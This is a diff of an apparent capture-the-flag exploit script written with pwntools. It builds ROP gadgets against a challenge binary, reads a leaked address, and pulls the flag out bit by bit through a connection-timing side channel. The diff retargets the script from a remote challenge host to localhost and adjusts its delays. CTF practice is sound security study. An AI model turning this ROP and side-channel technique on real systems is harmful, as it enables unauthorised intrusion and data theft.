@@ -4,7 +4,7 @@ context.arch = "amd64"
 
 elf = ELF("./chal",checksec=False)  # Load the binary
 rop = ROP(elf) 
-local = False  # Set to False for remote connections (even localhost)
+local = False
 
 gadgets = {
     'pop rdi': rop.find_gadget(['pop rdi', 'ret'])[0],
@@ -20,8 +20,8 @@ flag = ''
 for i in range(50):
     flag_char = ''
     for j in range(7):
-        # Connect to localhost Docker container
-        p = remote("play.h7tex.com", 37327)
+        # p = process('./chal')
+        p = remote("localhost", 1337)
         p.recvuntil(b'The flag file object is stored at: ')
         leak = int(p.recvline().strip().decode(), 16)
         # print(hex(leak))
@@ -54,7 +54,7 @@ for i in range(50):
 
         # the below line is important
         if local == True:
-            sleep(0.05)  # Reduced from 0.1
+            sleep(0.1)
             if p.poll() is None:
                 flag_char = '0' + flag_char
                 p.close()
@@ -62,9 +62,9 @@ for i in range(50):
                 flag_char = '1' + flag_char
             print(flag_char)
         else:
-            sleep(0.1)  # Reduced from 0.2 to 0.1 for faster extraction
+            sleep(0.2)
             try:
-                data = p.recv(1, timeout=0.5)  # Reduced timeout from 1 to 0.5
+                data = p.recv(1, timeout=1)  # Attempt to receive 1 byte
                 if not data:  # If empty, connection is closed
                     # print("Connection closed")
                     flag_char = '0' + flag_char
